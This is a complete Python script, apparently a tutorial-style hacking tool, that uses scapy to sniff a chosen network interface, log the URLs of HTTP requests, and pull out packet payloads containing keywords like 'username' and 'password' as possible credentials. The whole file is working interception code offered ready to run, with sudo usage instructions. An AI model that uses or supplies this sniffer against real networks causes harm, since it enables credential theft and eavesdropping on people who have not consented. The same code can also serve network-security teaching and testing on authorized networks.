#!/usr/bin/env python3
import scapy.all as scapy
from scapy.layers import http
import sys

def sniff(interface):
    try:
        print(f"[*] Starting sniffer on interface: {interface}")
        print("[*] Press Ctrl+C to stop")
        scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
    except PermissionError:
        print("ERROR: You must run this script with sudo!")
        print(f"Command: sudo python3 {sys.argv[0]} [interface]")
        sys.exit(1)

def get_url(packet):
    try:
        host = packet[http.HTTPRequest].Host
        path = packet[http.HTTPRequest].Path
        
        # Decode if it's in bytes
        if isinstance(host, bytes):
            host = host.decode('utf-8', errors='ignore')
        if isinstance(path, bytes):
            path = path.decode('utf-8', errors='ignore')
            
        return host + path
    except:
        return "URL not available"

def get_login_info(packet):
    try:
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            
            # Decode if it's in bytes
            if isinstance(load, bytes):
                load = load.decode('utf-8', errors='ignore')
            
            keywords = ["username", "user", "login", "password", "pass"]
            for keyword in keywords:
                if keyword in load.lower():
                    return load[:100]  # Limit to 100 characters
    except:
        pass
    return None

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >>", url)

        login_info = get_login_info(packet)
        if login_info:
            print("\n[+] Possible username/password:", login_info[:100], "\n")

# Check if interface is provided
if len(sys.argv) < 2:
    print("Usage: sudo python3", sys.argv[0], "<interface>")
    print("\nAvailable interfaces:")
    try:
        # Show available interfaces
        interfaces = scapy.get_if_list()
        for iface in interfaces:
            print(f"  - {iface}")
    except:
        print("  (Unable to list interfaces)")
    
    print("\nExamples:")
    print(f"  sudo python3 {sys.argv[0]} eth0")
    print(f"  sudo python3 {sys.argv[0]} wlan0")
    print(f"  sudo python3 {sys.argv[0]} en0")
    sys.exit(1)

# Get interface from command line argument
interface = sys.argv[1]

# Start sniffing
sniff(interface)